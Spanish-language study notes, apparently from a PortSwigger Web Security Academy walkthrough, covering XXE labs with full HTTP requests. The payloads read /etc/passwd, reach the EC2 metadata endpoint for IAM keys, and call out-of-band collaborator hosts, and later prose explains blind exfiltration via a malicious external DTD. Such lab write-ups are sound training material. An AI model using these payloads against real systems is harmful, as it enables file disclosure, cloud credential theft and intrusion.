[[RED TEAM]]

2|653C[8Wr=J-rN"ygd,$495$Hg&k94}

---
# Lab 1 : Exploiting XXE external entities to retrieve files

Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta. Para resolver el laboratorio, inyecte una entidad externa XML para recuperar el contenido del archivo /etc/passwd.

![[Pasted image 20230814115018.png|]]

```
POST /product/stock HTTP/2
Host: 0a5e005b047c4a7f839eb52500a40035.web-security-academy.net
Cookie: session=eKUxopFI8gCrE9jZ3wmXyq8KSuRgRP8B
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a5e005b047c4a7f839eb52500a40035.web-security-academy.net/product?productId=2
Content-Type: application/xml
Content-Length: 107
Origin: https://0a5e005b047c4a7f839eb52500a40035.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>
2
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

![[Pasted image 20230814121015.png|1000]]

```
POST /product/stock HTTP/2
Host: 0a5e005b047c4a7f839eb52500a40035.web-security-academy.net
Cookie: session=eKUxopFI8gCrE9jZ3wmXyq8KSuRgRP8B
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a5e005b047c4a7f839eb52500a40035.web-security-academy.net/product?productId=2
Content-Type: application/xml
Content-Length: 173
Origin: https://0a5e005b047c4a7f839eb52500a40035.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
---
# Lab 2 : Exploiting XXE to perform SSRF attacks

Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta. 
El servidor de laboratorio ejecuta un punto final de metadatos EC2 (simulado) en la URL predeterminada, que es http://169.254.169.254/. 
Este punto final se puede usar para recuperar datos sobre la instancia, algunos de los cuales pueden ser confidenciales. 
Para resolver el laboratorio, aproveche la vulnerabilidad XXE para realizar un ataque SSRF que obtenga la clave de acceso secreta de IAM del servidor desde el extremo de metadatos de EC2.

![[Pasted image 20230814124020.png|1000]]

```
POST /product/stock HTTP/2
Host: 0a4300f30381a858844c05d100ba005e.web-security-academy.net
Cookie: session=xHHQ5Bygw4W73yMvI9XBqwWZqN9aizAc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a4300f30381a858844c05d100ba005e.web-security-academy.net/product?productId=2
Content-Type: application/xml
Content-Length: 176
Origin: https://0a4300f30381a858844c05d100ba005e.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>
1
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
![[Pasted image 20230814124522.png|1000]]

```
POST /product/stock HTTP/2
Host: 0a4300f30381a858844c05d100ba005e.web-security-academy.net
Cookie: session=xHHQ5Bygw4W73yMvI9XBqwWZqN9aizAc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a4300f30381a858844c05d100ba005e.web-security-academy.net/product?productId=2
Content-Type: application/xml
Content-Length: 180
Origin: https://0a4300f30381a858844c05d100ba005e.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
![[Pasted image 20230814125036.png|1000]]

![[Pasted image 20230814125142.png|1000]]

---

# Lab 3 : Blind XXE with out-of-band interaction via XML parameter entities

Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML, pero no muestra ningún valor inesperado y bloquea las solicitudes que contienen entidades externas regulares. Para resolver el laboratorio, use una entidad de parámetro para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.

```java
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://iseyaezmbw57zv1uxms07rn10s6juei3.oastify.com/TESTXXE">]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

![[Pasted image 20230815164453.png]]

![[Pasted image 20230815164943.png]]

![[Pasted image 20230815164959.png]]

---
# Lab 4 : Blind XXE with out-of-band interaction via XML parameter entities

La inyección de entidad externa XML (XXE) es una vulnerabilidad que se produce cuando una aplicación web procesa entradas XML no confiables sin la debida validación o mitigación. Un atacante puede aprovechar esta vulnerabilidad para cargar entidades XML externas, lo que podría resultar en la revelación de información confidencial del servidor, ataques de denegación de servicio o incluso la ejecución de código remoto.

En el contexto de "Blind XXE", el ataque es denominado "ciego" porque el atacante no recibe directamente la respuesta del servidor, lo que significa que no puede ver directamente la salida del ataque. En lugar de eso, el atacante explora la posibilidad de interacciones fuera de banda. Esto significa que el atacante induce al servidor a comunicarse con recursos controlados por el atacante, como un servidor web o un servicio de red, para obtener información sobre el éxito o el resultado del ataque.

La técnica de "out-of-band interaction via XML parameter entities" se refiere a la forma en que el atacante logra la interacción fuera de banda utilizando entidades de parámetros XML. Las entidades de parámetros XML son constructos en XML que permiten definir y utilizar variables para representar datos. Los atacantes pueden aprovechar estas entidades de parámetros para provocar solicitudes de red desde el servidor vulnerable hacia recursos controlados por el atacante, como servidores web, sistemas DNS o servidores FTP. Luego, el atacante puede monitorear estas interacciones fuera de banda para obtener información sobre el éxito del ataque.

```java
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://1eghwxl5xfrqlendj5ejta9kmbs2gy4n.oastify.com/testing"> %xxe; ]>
<stockCheck>
<productId>
2
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

![[Pasted image 20230815173326.png]]

![[Pasted image 20230815173958.png]]

![[Pasted image 20230815174105.png]]

---

# Lab 5 : Exploiting blind XXE to exfiltrate data using a malicious external DTD

Exploiting blind XXE to exfiltrate data using a malicious external DTD" se refiere a una técnica de ataque que aprovecha una vulnerabilidad de "XML External Entity Injection" (XXE) ciega para extraer datos confidenciales utilizando una DTD (Documento de Tipo de Documento) externa maliciosa.

Para entender esto mejor, desglosemos los elementos clave:

1. **XML External Entity Injection (XXE)**: Es una vulnerabilidad que ocurre cuando una aplicación procesa entradas XML no confiables sin la debida validación o mitigación. Permite que un atacante cargue entidades XML externas, lo que puede resultar en la exposición de información confidencial, ataques de denegación de servicio o incluso la ejecución remota de código.
    
2. **Blind XXE**: En este caso, se refiere a la situación en la que el atacante no recibe respuestas directas del servidor sobre los resultados de la inyección. En lugar de eso, el atacante intenta inferir el éxito del ataque observando interacciones "fuera de banda", es decir, interacciones del servidor con recursos controlados por el atacante, como solicitudes de red.
    
3. **Exfiltración de datos**: Se refiere al acto de robar o extraer datos confidenciales o valiosos desde un sistema o aplicación.
    
4. **Malicious external DTD**: Una DTD externa es una referencia a una definición de tipo de documento que se encuentra fuera del propio documento XML. Un atacante puede utilizar una DTD maliciosa para definir entidades que hacen referencia a recursos controlados por el atacante, como direcciones de IP o URLs. Esto permite al atacante llevar a cabo ataques de XXE ciegos y potencialmente extraer información sensible.



